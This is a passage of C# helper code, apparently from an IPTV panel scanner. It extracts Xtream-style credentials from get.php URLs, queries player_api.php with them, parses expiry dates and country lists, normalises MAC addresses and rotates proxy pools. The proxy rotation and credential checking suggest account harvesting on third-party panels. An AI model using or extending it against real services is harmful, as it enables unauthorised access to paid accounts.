                                {
                                    var s = t.GetString();
                                    if (!string.IsNullOrWhiteSpace(s)) titles.Add(s.Trim());
                                }
                                else if (item.ValueKind == JsonValueKind.String)
                                {
                                    var s = item.GetString();
                                    if (!string.IsNullOrWhiteSpace(s)) titles.Add(s.Trim());
                                }
                            }
                        }
                        else if (jsEl.ValueKind == JsonValueKind.Object)
                        {
                            JsonElement dataEl;
                            if ((jsEl.TryGetProperty("data", out dataEl) && dataEl.ValueKind == JsonValueKind.Array) ||
                                (jsEl.TryGetProperty("genres", out dataEl) && dataEl.ValueKind == JsonValueKind.Array))
                            {
                                foreach (var item in dataEl.EnumerateArray())
                                {
                                    if (item.ValueKind == JsonValueKind.Object && item.TryGetProperty("title", out var t) && t.ValueKind == JsonValueKind.String)
                                    {
                                        var s = t.GetString();
                                        if (!string.IsNullOrWhiteSpace(s)) titles.Add(s.Trim());
                                    }
                                    else if (item.ValueKind == JsonValueKind.String)
                                    {
                                        var s = item.GetString();
                                        if (!string.IsNullOrWhiteSpace(s)) titles.Add(s.Trim());
                                    }
                                }
                            }
                        }
                    }
                    // generic walk: try to find "title" keys anywhere
                    if (titles.Count == 0)
                    {
                        var matches = Regex.Matches(genresText, @"""title""\s*:\s*""([^""]+)""");
                        foreach (Match mm in matches)
                        {
                            var s = mm.Groups[1].Value.Trim();
                            if (!string.IsNullOrWhiteSpace(s)) titles.Add(s);
                        }
                    }
                }
                return titles.Count > 0 ? titles.Distinct(StringComparer.OrdinalIgnoreCase).ToList() : null;
            }
            catch
            {
                // fallback: regex only
                try
                {
                    var matches = Regex.Matches(genresText ?? "", @"""title""\s*:\s*""([^""]+)""");
                    var list = new List<string>();
                    foreach (Match mm in matches)
                    {
                        var s = mm.Groups[1].Value.Trim();
                        if (!string.IsNullOrWhiteSpace(s)) list.Add(s);
                    }
                    return list.Count > 0 ? list.Distinct(StringComparer.OrdinalIgnoreCase).ToList() : null;
                }
                catch { return null; }
            }
        }

        // Country extraction helper (robust)
        private static string? ExtractCountryListFromCombined(string combined)
        {
            if (string.IsNullOrWhiteSpace(combined)) return null;

            try
            {
                var jsonElements = TryParseJsonElements(combined);
                foreach (var el in jsonElements)
                {
                    var keys = new[]
                    {
                        "countries","available_countries","allowed_countries","country_list","availableCountries",
                        "countryCodes","country_codes","allowedCountries","allowedCountriesList","regions","locations",
                        "available_in","allowed_in","countries_list","countriesAllowed","countriesAllowedList"
                    };

                    foreach (var k in keys)
                    {
                        if (JsonElementExtensions.TryGetPropertyIgnoreCaseExt(el, k, out var v))
                        {
                            var list = FlattenTokenToList(v);
                            if (list != null && list.Count > 0)
                                return FormatList(list);
                        }
                    }

                    if (JsonElementExtensions.TryGetPropertyIgnoreCaseExt(el, "js", out var jsTok))
                    {
                        var parsed = ExtractStringsFromToken(jsTok);
                        var maybe = parsed?.Where(x => LooksLikeCountryOrCode(x)).Distinct().ToList();
                        if (maybe != null && maybe.Count > 0) return FormatList(maybe);
                    }

                    var strs = ExtractStringsFromToken(el);
                    var found = strs?.Where(x => LooksLikeCountryOrCode(x)).Distinct().ToList();
                    if (found != null && found.Count > 0) return FormatList(found);
                }
            }
            catch { }

            try
            {
                var listRegexes = new[]
                {
                    new Regex(@"(?i)(countries|available_countries|allowed_countries|country_list)\s*[:=]\s*([A-Za-z0-9\-\|\_,\s]+)"),
                    new Regex(@"(?i)country[s]?\s*[:]\s*([A-Za-z]{2,3}(?:[,|/]\s*[A-Za-z]{2,3})+)")
                };

                foreach (var r in listRegexes)
                {
                    var m = r.Match(combined);
                    if (m.Success)
                    {
                        var group = m.Groups.Count > 2 ? m.Groups[2].Value : m.Groups[1].Value;
                        var parts = SplitAndNormalize(group).Where(x => LooksLikeCountryOrCode(x)).Distinct().ToList();
                        if (parts.Count > 0) return FormatList(parts);
                    }
                }

                var options = Regex.Matches(combined, @"<option[^>]*>([^<]{2,80})<\/option>", RegexOptions.IgnoreCase)
                                   .Cast<Match>().Select(m => m.Groups[1].Value.Trim()).Where(s => s.Length > 0).ToList();
                if (options.Count > 0)
                {
                    var found = options.Where(x => LooksLikeCountryOrCode(x)).Distinct().ToList();
                    if (found.Count > 0) return FormatList(found);
                }

                var cells = Regex.Matches(combined, @"<t[dh][^>]*>\s*([^<]{2,80})\s*<\/t[dh]>", RegexOptions.IgnoreCase)
                                 .Cast<Match>().Select(m => m.Groups[1].Value.Trim()).Where(s => s.Length > 0).ToList();
                if (cells.Count > 0)
                {
                    var found = cells.Where(x => LooksLikeCountryOrCode(x)).Distinct().ToList();
                    if (found.Count > 0) return FormatList(found);
                }

                var delim = Regex.Match(combined, @"(?i)(countries|available_countries|allowed_countries|country_list)[^:={\n\r]*[:=]\s*[""']?([A-Za-z0-9\-,\|\/\s]+)[""']?");
                if (delim.Success)
                {
                    var candidate = delim.Groups[2].Value;
                    var parsed = SplitAndNormalize(candidate).Where(x => LooksLikeCountryOrCode(x)).Distinct().ToList();
                    if (parsed.Count > 0) return FormatList(parsed);
                }

                var isoMatches = Regex.Matches(combined, @"\b([A-Z]{2})\b").Cast<Match>().Select(m => m.Groups[1].Value).Distinct().ToList();
                var plausible = isoMatches.Where(x => IsLikelyCountryCode(x)).ToList();
                if (plausible.Count >= 2) return FormatList(plausible);
            }
            catch { }

            return null;
        }

        private static string FormatList(IEnumerable<string> list)
        {
            var arr = list.Take(200).ToArray();
            return "├❱❱❱ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲-𝐋𝐢𝐬𝐭:\r\n│ " + string.Join(", ", arr) + "\r\n╰─";
        }

        private static List<string> SplitAndNormalize(string s)
        {
            if (string.IsNullOrWhiteSpace(s)) return new List<string>();
            var parts = s.Split(new[] { ',', '|', '/', ';' }, StringSplitOptions.RemoveEmptyEntries)
                         .Select(p => p.Trim().Trim('\"', '\'', '[', ']', '{', '}'))
                         .Where(p => p.Length > 0).ToList();
            return parts;
        }

        private static bool LooksLikeCountryOrCode(string s)
        {
            if (string.IsNullOrWhiteSpace(s)) return false;
            s = s.Trim();
            if (s.Length <= 3 && Regex.IsMatch(s, @"^[A-Za-z]{2,3}$")) return true; // ISO code
            if (s.Length >= 3 && s.Length <= 30 && Regex.IsMatch(s, @"^[A-Za-z \-]{3,30}$")) return true; // name-like
            return false;
        }

        private static bool IsLikelyCountryCode(string code)
        {
            var blacklist = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "TV", "IP", "ID", "OK", "ON", "IN", "AT" };
            if (blacklist.Contains(code)) return false;
            return Regex.IsMatch(code, @"^[A-Z]{2}$");
        }

        private static List<string> ExtractStringsFromToken(JsonElement token)
        {
            var list = new List<string>();
            try
            {
                switch (token.ValueKind)
                {
                    case JsonValueKind.Array:
                        foreach (var el in token.EnumerateArray())
                        {
                            if (el.ValueKind == JsonValueKind.String) list.Add(el.GetString() ?? "");
                            else if (el.ValueKind == JsonValueKind.Object || el.ValueKind == JsonValueKind.Array)
                            {
                                list.AddRange(ExtractStringsFromToken(el));
                            }
                        }
                        break;
                    case JsonValueKind.Object:
                        foreach (var prop in token.EnumerateObject())
                        {
                            if (prop.Value.ValueKind == JsonValueKind.String) list.Add(prop.Value.GetString() ?? "");
                            else list.AddRange(ExtractStringsFromToken(prop.Value));
                        }
                        break;
                    case JsonValueKind.String:
                        list.Add(token.GetString() ?? "");
                        break;
                    default:
                        break;
                }
            }
            catch { }
            return list.Where(x => !string.IsNullOrWhiteSpace(x)).ToList();
        }

        private static List<JsonElement> TryParseJsonElements(string text)
        {
            var results = new List<JsonElement>();
            try
            {
                using var doc = JsonDocument.Parse(text);
                results.Add(doc.RootElement.Clone());
                return results;
            }
            catch
            {
                // try to find JSON objects inside text
            }

            // naive extraction of {...} blocks
            var objRegex = new Regex(@"\{(?:[^{}]|\{(?<open>)|\}(?<-open>))*(?(open)(?!))\}", RegexOptions.Singleline);
            foreach (Match m in objRegex.Matches(text))
            {
                try
                {
                    using var doc = JsonDocument.Parse(m.Value);
                    results.Add(doc.RootElement.Clone());
                }
                catch { }
            }
            return results;
        }

        private static List<string>? FlattenTokenToList(JsonElement v)
        {
            var items = new List<string>();
            try
            {
                if (v.ValueKind == JsonValueKind.Array)
                {
                    foreach (var el in v.EnumerateArray())
                    {
                        if (el.ValueKind == JsonValueKind.String) items.Add(el.GetString() ?? "");
                        else if (el.ValueKind == JsonValueKind.Object)
                        {
                            if (el.TryGetProperty("code", out var c) && c.ValueKind == JsonValueKind.String) items.Add(c.GetString() ?? "");
                            else if (el.TryGetProperty("name", out var n) && n.ValueKind == JsonValueKind.String) items.Add(n.GetString() ?? "");
                            else items.AddRange(ExtractStringsFromToken(el));
                        }
                        else
                        {
                            items.AddRange(ExtractStringsFromToken(el));
                        }
                    }
                }
                else if (v.ValueKind == JsonValueKind.String)
                {
                    var s = v.GetString() ?? "";
                    items.AddRange(SplitAndNormalize(s));
                }
                else if (v.ValueKind == JsonValueKind.Object)
                {
                    if (v.TryGetProperty("code", out var c2) && c2.ValueKind == JsonValueKind.String) items.Add(c2.GetString() ?? "");
                    if (v.TryGetProperty("name", out var n2) && n2.ValueKind == JsonValueKind.String) items.Add(n2.GetString() ?? "");
                    items.AddRange(ExtractStringsFromToken(v));
                }
            }
            catch { }
            return items.Count > 0 ? items : null;
        }

        // ---------- NEW HELPERS: normalization/parse helpers for nested get.php/password cases ----------
        private static string? NormalizeGetPhpWithNestedPassword(string input, string? panelUrl)
        {
            if (string.IsNullOrWhiteSpace(input)) return null;
            try
            {
                var s = input.Trim();
                s = s.Replace("\\/", "/").Trim();
                var m = Regex.Match(s, @"(?<url>https?:\/\/(?<host>[^\/\s""']+)(?::\d+)?\/get\.php\?(?<qs>[^ \r\n""']+))", RegexOptions.IgnoreCase);
                if (!m.Success)
                {
                    var qOnly = Regex.Match(s, @"(?:username=([^&\s]+)).*(?:password=([^&\s]+))", RegexOptions.IgnoreCase);
                    if (qOnly.Success && !string.IsNullOrWhiteSpace(panelUrl))
                    {
                        try
                        {
                            var p = panelUrl;
                            if (!p.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !p.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                                p = "http://" + p;
                            var u = new Uri(p);
                            var baseUrl = $"{u.Scheme}://{u.Host}" + (u.IsDefaultPort ? "" : ":" + u.Port);
                            return baseUrl + "/get.php?" + qOnly.Value;
                        }
                        catch { /* best effort */ }
                    }
                    return null;
                }

                var host = m.Groups["host"].Value;
                var qs = m.Groups["qs"].Value;
                var outer = ParseQueryString(qs);

                if (!outer.TryGetValue("username", out var username) || string.IsNullOrWhiteSpace(username))
                {
                    return m.Groups["url"].Value.Trim();
                }

                outer.TryGetValue("password", out var passwordRaw);
                if (!string.IsNullOrWhiteSpace(passwordRaw) && passwordRaw.IndexOf("mac=", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    var nested = Uri.UnescapeDataString(passwordRaw);
                    var qidx = nested.IndexOf('?');
                    var innerQuery = qidx >= 0 ? nested.Substring(qidx + 1) : nested;

                    if (outer.TryGetValue("play_token", out var pt) && innerQuery.IndexOf("play_token=", StringComparison.OrdinalIgnoreCase) < 0)
                        innerQuery += (innerQuery.Length > 0 ? "&" : "") + "play_token=" + Uri.EscapeDataString(pt);
                    if (outer.TryGetValue("type", out var t) && innerQuery.IndexOf("type=", StringComparison.OrdinalIgnoreCase) < 0)
                        innerQuery += (innerQuery.Length > 0 ? "&" : "") + "type=" + Uri.EscapeDataString(t);
                    if (outer.TryGetValue("output", out var outp) && innerQuery.IndexOf("output=", StringComparison.OrdinalIgnoreCase) < 0)
                        innerQuery += (innerQuery.Length > 0 ? "&" : "") + "output=" + Uri.EscapeDataString(outp);

                    var scheme = m.Groups["url"].Value.StartsWith("https://", StringComparison.OrdinalIgnoreCase) ? "https" : "http";
                    var finalBase = $"{scheme}://{host}";
                    var final = $"{finalBase}/get.php?username={Uri.EscapeDataString(username)}&password={Uri.EscapeDataString(innerQuery)}";
                    final = Regex.Replace(final, @"&{2,}", "&").TrimEnd('&');
                    return final;
                }

                return m.Groups["url"].Value.Trim();
            }
            catch
            {
                return null;
            }
        }

        private static Dictionary<string, string> ParseQueryString(string qs)
        {
            var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            if (string.IsNullOrWhiteSpace(qs)) return d;
            foreach (var part in qs.Split(new[] { '&' }, StringSplitOptions.RemoveEmptyEntries))
            {
                var kv = part.Split(new[] { '=' }, 2);
                var key = Uri.UnescapeDataString(kv[0] ?? "").Trim();
                var val = kv.Length > 1 ? Uri.UnescapeDataString(kv[1] ?? "").Trim() : "";
                if (!string.IsNullOrEmpty(key) && !d.ContainsKey(key)) d[key] = val;
            }
            return d;
        }
        // --------------------------------------------------------------------------------------------

        // case-insensitive TryFindJsonValue helper
        private static bool TryFindJsonValue(JsonElement el, string[] keys, out JsonElement found)
        {
            found = default;
            try
            {
                if (el.ValueKind == JsonValueKind.Object)
                {
                    foreach (var prop in el.EnumerateObject())
                    {
                        var name = prop.Name.Trim();
                        if (keys.Any(k => string.Equals(k, name, StringComparison.OrdinalIgnoreCase)))
                        {
                            found = prop.Value;
                            return true;
                        }
                    }
                    foreach (var prop in el.EnumerateObject())
                    {
                        if (prop.Value.ValueKind == JsonValueKind.Object || prop.Value.ValueKind == JsonValueKind.Array)
                        {
                            if (TryFindJsonValue(prop.Value, keys, out found)) return true;
                        }
                    }
                }
                else if (el.ValueKind == JsonValueKind.Array)
                {
                    foreach (var item in el.EnumerateArray())
                    {
                        if (item.ValueKind == JsonValueKind.Object || item.ValueKind == JsonValueKind.Array)
                        {
                            if (TryFindJsonValue(item, keys, out found)) return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static int? ExtractDaysFromCombinedText(string combined)
        {
            if (string.IsNullOrWhiteSpace(combined)) return null;

            try
            {
                using (var doc = JsonDocument.Parse(combined))
                {
                    var root = doc.RootElement;

                    var dateKeysPreferred = new[] { "end_date", "endDate", "expirydate", "expire_date", "expire_billing_date", "tariff_expired_date", "end" };
                    if (TryFindJsonValue(root, dateKeysPreferred, out var endEl))
                    {
                        if (endEl.ValueKind == JsonValueKind.String)
                        {
                            var s = endEl.GetString()?.Trim();
                            if (!string.IsNullOrEmpty(s))
                            {
                                if (TryParseDateFlexible(s, out var dt))
                                    return (int)Math.Floor((dt - DateTime.UtcNow).TotalDays);
                                if (long.TryParse(s, out var uts) && uts > 1000000000L)
                                {
                                    var dt2 = DateTimeOffset.FromUnixTimeSeconds(uts).UtcDateTime;
                                    return (int)Math.Floor((dt2 - DateTime.UtcNow).TotalDays);
                                }
                            }
                        }
                        else if (endEl.ValueKind == JsonValueKind.Number && endEl.TryGetInt64(out var lval) && lval > 1000000000L)
                        {
                            var dt3 = DateTimeOffset.FromUnixTimeSeconds(lval).UtcDateTime;
                            return (int)Math.Floor((dt3 - DateTime.UtcNow).TotalDays);
                        }
                    }

                    if (TryFindJsonValue(root, new[] { "phone" }, out var phoneEl))
                    {
                        string? phoneVal = null;
                        if (phoneEl.ValueKind == JsonValueKind.String) phoneVal = phoneEl.GetString();
                        else if (phoneEl.ValueKind == JsonValueKind.Number) phoneVal = phoneEl.ToString();

                        if (!string.IsNullOrWhiteSpace(phoneVal))
                        {
                            var p = phoneVal.Trim();
                            if (p.Length >= 2 && p.Substring(0, 2).Equals("un", StringComparison.OrdinalIgnoreCase))
                                return 9999;
                            if (TryParseDateFlexible(p, out var pd))
                                return (int)Math.Floor((pd - DateTime.UtcNow).TotalDays);
                            var mDate = Regex.Match(p, @"(\d{1,2}[.\-/]\d{1,2}[.\-/]\d{2,4})");
                            if (mDate.Success && TryParseDateFlexible(mDate.Groups[1].Value, out var pd2))
                                return (int)Math.Floor((pd2 - DateTime.UtcNow).TotalDays);
                        }
                    }

                    var numericKeys = new[] { "expires_in", "remaining_days", "ttl", "days_to_end", "remaining", "valid_days", "days" };
                    if (TryFindJsonValue(root, numericKeys, out var numEl))
                    {
                        if (numEl.ValueKind == JsonValueKind.Number && numEl.TryGetInt32(out var nVal))
                            return nVal;
                        if (numEl.ValueKind == JsonValueKind.String && int.TryParse(numEl.GetString(), out var nVal2))
                            return nVal2;
                    }

                    if (TryFindJsonValue(root, new[] { "exp_date", "expiry", "expiry_date" }, out var expEl))
                    {
                        if (expEl.ValueKind == JsonValueKind.Number && expEl.TryGetInt64(out var sec) && sec > 1000000000L)
                        {
                            var dt = DateTimeOffset.FromUnixTimeSeconds(sec).UtcDateTime;
                            return (int)Math.Floor((dt - DateTime.UtcNow).TotalDays);
                        }
                        if (expEl.ValueKind == JsonValueKind.String)
                        {
                            var s = expEl.GetString();
                            if (!string.IsNullOrWhiteSpace(s))
                            {
                                if (long.TryParse(s, out var sec2) && sec2 > 1000000000L)
                                {
                                    var dt2 = DateTimeOffset.FromUnixTimeSeconds(sec2).UtcDateTime;
                                    return (int)Math.Floor((dt2 - DateTime.UtcNow).TotalDays);
                                }
                                if (TryParseDateFlexible(s, out var dt3))
                                    return (int)Math.Floor((dt3 - DateTime.UtcNow).TotalDays);
                            }
                        }
                    }
                }
            }
            catch { }

            try
            {
                var mEndText = Regex.Match(combined, @"""(?:end_date|expirydate|expire_date|expire_billing_date|tariff_expired_date)""\s*:\s*""(?<d>[^""]+)""", RegexOptions.IgnoreCase);
                if (mEndText.Success)
                {
                    var s = mEndText.Groups["d"].Value.Trim();
                    if (s.Length >= 2 && s.Substring(0, 2).Equals("un", StringComparison.OrdinalIgnoreCase))
                        return 9999;
                    if (TryParseDateFlexible(s, out var dtt))
                        return (int)Math.Floor((dtt - DateTime.UtcNow).TotalDays);
                    if (long.TryParse(s, out var uts) && uts > 1000000000L)
                    {
                        var dt = DateTimeOffset.FromUnixTimeSeconds(uts).UtcDateTime;
                        return (int)Math.Floor((dt - DateTime.UtcNow).TotalDays);
                    }
                }

                var mPhone = Regex.Match(combined, @"""phone""\s*:\s*""(?<p>[^""]+)""", RegexOptions.IgnoreCase);
                if (mPhone.Success)
                {
                    var p = mPhone.Groups["p"].Value.Trim();
                    if (p.Length >= 2 && p.Substring(0, 2).Equals("un", StringComparison.OrdinalIgnoreCase))
                        return 9999;
                    if (TryParseDateFlexible(p, out var pd))
                        return (int)Math.Floor((pd - DateTime.UtcNow).TotalDays);
                }

                var mNum = Regex.Match(combined, @"""(?:expires_in|remaining_days|ttl|days_to_end|remaining|valid_days|days)""\s*[:=]\s*""?(?<num>\d{1,5})""?", RegexOptions.IgnoreCase);
                if (mNum.Success && int.TryParse(mNum.Groups["num"].Value, out var valNum))
                    return valNum;

                var mUnix = Regex.Match(combined, @"""exp_date""\s*:\s*""?(\d{9,})""?", RegexOptions.IgnoreCase);
                if (mUnix.Success && long.TryParse(mUnix.Groups[1].Value, out var ts) && ts > 1000000000L)
                {
                    var dt = DateTimeOffset.FromUnixTimeSeconds(ts).UtcDateTime;
                    return (int)Math.Floor((dt - DateTime.UtcNow).TotalDays);
                }

                var mFancy = Regex.Match(combined, @"Expires\s*[:➤-]*\s*(?<date>\d{1,2}[.\-/]\d{1,2}[.\-/]\d{2,4})(?:[^\d\n\r]+(?<days>\d{1,4})\s*Days?)?", RegexOptions.IgnoreCase);
                if (mFancy.Success)
                {
                    if (mFancy.Groups["days"].Success && int.TryParse(mFancy.Groups["days"].Value, out var ddd))
                        return ddd;
                    var ds = mFancy.Groups["date"].Value;
                    if (TryParseDateFlexible(ds, out var dtd))
                        return (int)Math.Floor((dtd - DateTime.UtcNow).TotalDays);
                }

                var mDays = Regex.Match(combined, @"\b(?<d>\d{1,4})\s*Days\b", RegexOptions.IgnoreCase);
                if (mDays.Success && int.TryParse(mDays.Groups["d"].Value, out var dd))
                    return dd;

                var mForDays = Regex.Match(combined, @"valid\s+(?:for\s+)?(?<n>\d{1,4})\s*days", RegexOptions.IgnoreCase);
                if (mForDays.Success && int.TryParse(mForDays.Groups["n"].Value, out var fd)) return fd;
            }
            catch { }

            return null;
        }

        private static bool TryParseDateFlexible(string s, out DateTime dt)
        {
            dt = default;
            if (string.IsNullOrWhiteSpace(s)) return false;
            s = s.Trim();

            var formats = new[]
            {
                "dd.MM.yyyy","d.M.yyyy","dd-MM-yyyy","yyyy-MM-dd","dd/MM/yyyy","MM/dd/yyyy",
                "yyyy-MM-dd HH:mm:ss","dd.MM.yyyy HH:mm:ss",
                "MMMM d, yyyy, h:mm tt","MMMM d, yyyy","MMM d, yyyy","yyyyMMdd"
            };

            if (DateTime.TryParseExact(s, formats, CultureInfo.InvariantCulture, DateTimeStyles.AssumeLocal | DateTimeStyles.AdjustToUniversal, out dt))
            { dt = dt.ToUniversalTime(); return true; }

            if (DateTime.TryParse(s, CultureInfo.InvariantCulture, DateTimeStyles.AssumeLocal, out dt))
            { dt = dt.ToUniversalTime(); return true; }

            if (DateTime.TryParse(s, CultureInfo.GetCultureInfo("en-US"), DateTimeStyles.AssumeLocal, out dt))
            { dt = dt.ToUniversalTime(); return true; }

            if (long.TryParse(s, out var ts) && ts > 1000000000L)
            { try { dt = DateTimeOffset.FromUnixTimeSeconds(ts).UtcDateTime; return true; } catch { } }

            var m = Regex.Match(s, @"(\d{1,2}[.\-/]\d{1,2}[.\-/]\d{2,4})");
            if (m.Success && DateTime.TryParse(m.Groups[1].Value, out dt))
            { dt = dt.ToUniversalTime(); return true; }

            return false;
        }

        private static string ExtractLiveListFromCombined(string combined, string profile)
        {
            var cand = (combined ?? "") + "\n" + (profile ?? "");
            if (string.IsNullOrWhiteSpace(cand)) return "";

            try
            {
                var m = Regex.Match(cand, @"(?:Live\s*list|Live list|Live channels|Live:)\s*[:\-–]*\s*(?<list>[\s\S]{10,3000})", RegexOptions.IgnoreCase);
                if (m.Success)
                {
                    var s = m.Groups["list"].Value.Trim();
                    s = Regex.Replace(s, @"\s{2,}", " ");
                    if (s.Length > 1200) s = s.Substring(0, 1200) + "…";
                    return s;
                }

                var mm = Regex.Match(cand, @"([A-Za-z0-9\p{L}\s\-\.\,]{100,2000})");
                if (mm.Success)
                {
                    var s2 = mm.Groups[1].Value.Trim();
                    s2 = Regex.Replace(s2, @"\s{2,}", " ");
                    if (s2.Length > 1200) s2 = s2.Substring(0, 1200) + "…";
                    return s2;
                }
            }
            catch { }

            return "";
        }

        private static (string? baseUrl, string? user, string? pass) TryExtractXtreamCredsFromText(string combined, string panelUrl)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(combined)) combined = "";
                string? baseUrl = null;
                string? user = null;
                string? pass = null;

                var m = Regex.Match(combined, @"https?:\/\/(?<host>[^\/\s""]+)(?::\d+)?\/get\.php\?[^ \r\n""']*?(?:username|user|login|uname)=(?<u>[^&\s""']+)&(?:password|pass|pwd)=(?<p>[^&\s""']+)[^ \r\n""']*", RegexOptions.IgnoreCase);
                if (m.Success)
                {
                    var host = m.Groups["host"].Value;
                    var schema = combined.Contains("https://", StringComparison.OrdinalIgnoreCase) ? "https" : "http";
                    baseUrl = $"{schema}://{host}";
                    user = WebUtility.UrlDecode(m.Groups["u"].Value);
                    pass = WebUtility.UrlDecode(m.Groups["p"].Value);
                    return (baseUrl, user, pass);
                }

                if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
                {
                    var ju = Regex.Match(combined, @"""username""\s*:\s*""(?<u>[^""]+)""", RegexOptions.IgnoreCase);
                    var jp = Regex.Match(combined, @"""password""\s*:\s*""(?<p>[^""]+)""", RegexOptions.IgnoreCase);
                    if (ju.Success && jp.Success)
                    {
                        user = ju.Groups["u"].Value;
                        pass = jp.Groups["p"].Value;
                    }
                }

                if (string.IsNullOrWhiteSpace(baseUrl))
                {
                    var p = panelUrl;
                    if (!p.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !p.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                        p = "http://" + p;
                    var u = new Uri(p);
                    baseUrl = $"{u.Scheme}://{u.Host}" + (u.IsDefaultPort ? "" : ":" + u.Port);
                }

                if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(pass))
                    return (baseUrl, user, pass);
            }
            catch { }

            return (null, null, null);
        }

        private static async Task<string?> FetchXtreamPlayerApiAsync(string baseUrl, string user, string pass, CancellationToken ct, TimeSpan timeout)
        {
            try
            {
                using var http = new HttpClient() { Timeout = timeout };
                var url = $"{baseUrl}/player_api.php?username={WebUtility.UrlEncode(user)}&password={WebUtility.UrlEncode(pass)}";
                var resp = await http.GetAsync(url, ct).ConfigureAwait(false);
                return await resp.Content.ReadAsStringAsync().ConfigureAwait(false);
            }
            catch { return null; }
        }

        private async Task<string> SendWithTimeoutAndRetryAsync(HttpRequestMessage req, TimeSpan timeout, int maxRetries, CancellationToken ct)
        {
            var attempt = 0;
            var backoff = 250;
            while (true)
            {
                attempt++;
                try
                {
                    using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    linked.CancelAfter(timeout);
                    var resp = await _http.SendAsync(req, linked.Token).ConfigureAwait(false);
                    var txt = await resp.Content.ReadAsStringAsync().ConfigureAwait(false);
                    return txt ?? "";
                }
                catch (OperationCanceledException) { throw; }
                catch (Exception ex)
                {
                    if (attempt > maxRetries) { LogError("SendWithTimeoutAndRetryAsync", ex); return ""; }
                    await Task.Delay(backoff, ct).ConfigureAwait(false);
                    backoff = Math.Min(2000, backoff * 2);
                }
            }
        }

        private SocketsHttpHandler CreateHandlerWithProxy(ScanConfig config, string? proxy)
        {
            var h = new SocketsHttpHandler
            {
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                MaxConnectionsPerServer = Math.Max(16, config.MaxConnectionsPerServer),
                PooledConnectionLifetime = TimeSpan.FromSeconds(Math.Max(0, config.PooledConnectionLifetimeSeconds)),
                UseCookies = false,
                AllowAutoRedirect = true
            };

            var chosen = proxy;
            if (string.IsNullOrWhiteSpace(chosen) && !string.IsNullOrWhiteSpace(config.ProxyUrl) && TryNormalizeProxy(config.ProxyUrl, out var norm))
                chosen = norm;

            if (!string.IsNullOrWhiteSpace(chosen) && Uri.TryCreate(chosen, UriKind.Absolute, out var uri))
            {
                var wp = new WebProxy(uri);
                if (!string.IsNullOrEmpty(uri.UserInfo))
                {
                    var parts = uri.UserInfo.Split(':');
                    var user = Uri.UnescapeDataString(parts.ElementAtOrDefault(0) ?? "");
                    var pass = Uri.UnescapeDataString(parts.ElementAtOrDefault(1) ?? "");
                    wp.Credentials = new NetworkCredential(user, pass);
                }
                h.Proxy = wp;
                h.UseProxy = true;
            }

            return h;
        }

        private static string NormalizeMacString(string? mac)
        {
            if (string.IsNullOrWhiteSpace(mac)) return string.Empty;
            var s = mac.Trim().ToUpperInvariant();
            var hex = new string(s.Where(char.IsLetterOrDigit).ToArray());
            if (hex.Length < 12) return string.Empty;
            hex = hex.Substring(0, 12);
            var parts = Enumerable.Range(0, 6).Select(i => hex.Substring(i * 2, 2)).ToArray();
            return string.Join(":", parts);
        }

        private async Task<(List<string> pool, string? single)> BuildProxyPoolAsync(ScanConfig config, CancellationToken ct)
        {
            var pool = new List<string>();
            string? single = null;

            string raw = config.ProxyUrl?.Trim() ?? "";
            if (string.IsNullOrWhiteSpace(raw)) return (pool, single);

            if (raw.Contains('\n') || raw.Contains(',') || raw.Contains(';') || raw.Contains('|'))
            {
                var tokens = SplitMulti(raw);
                foreach (var t in tokens)
                    if (TryNormalizeProxy(t, out var norm)) pool.Add(norm);
                pool = pool.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
                return (pool, null);
            }

            try
            {
                if (File.Exists(raw))
                {
                    var content = await File.ReadAllTextAsync(raw, ct).ConfigureAwait(false);
                    var tokens = SplitMulti(content);
                    foreach (var t in tokens)
                        if (TryNormalizeProxy(t, out var norm)) pool.Add(norm);
                    pool = pool.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
                    return (pool, null);
                }
            }
            catch { }

            if (raw.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || raw.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                if (TryNormalizeProxy(raw, out var asProxy))
                {
                    single = asProxy;
                    return (pool, single);
                }

                try
                {
                    var resp = await _diagnosticHttpClient.GetAsync(raw, ct).ConfigureAwait(false);
                    if (resp.IsSuccessStatusCode)
                    {
                        var content = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
                        var tokens = SplitMulti(content);
                        foreach (var t in tokens)
                            if (TryNormalizeProxy(t, out var norm)) pool.Add(norm);
                        pool = pool.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
                        if (pool.Count > 0) return (pool, null);
                    }
                }
                catch { }
            }

            if (TryNormalizeProxy(raw, out var singleNorm))
                single = singleNorm;

            return (pool, single);
        }

        private static IEnumerable<string> SplitMulti(string content)
        {
            return content
                .Replace("\r", "\n")
                .Split(new[] { '\n', ',', ';', '|' }, StringSplitOptions.RemoveEmptyEntries)
                .Select(s => s.Trim());
        }

        private static bool TryNormalizeProxy(string raw, out string normalized)
        {
            normalized = "";
            if (string.IsNullOrWhiteSpace(raw)) return false;
            var s = raw.Trim();

            if (!s.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                !s.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                s = "http://" + s;
            }

            if (!Uri.TryCreate(s, UriKind.Absolute, out var uri)) return false;
            if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps) return false;
            if (string.IsNullOrWhiteSpace(uri.Host)) return false;

            normalized = uri.ToString().TrimEnd('/');
            return true;
        }

        private static string MaskProxy(string proxy)
        {
            try
            {
                var u = new Uri(proxy);
                var hostPort = u.IsDefaultPort ? u.Host : $"{u.Host}:{u.Port}";
                return $"{u.Scheme}://{hostPort}";
            }
            catch { return proxy; }
        }

        private void SafeRaiseStatus(string status, bool critical = false)
        {
            try
            {
                if (_statusBroadcaster != null)
                {
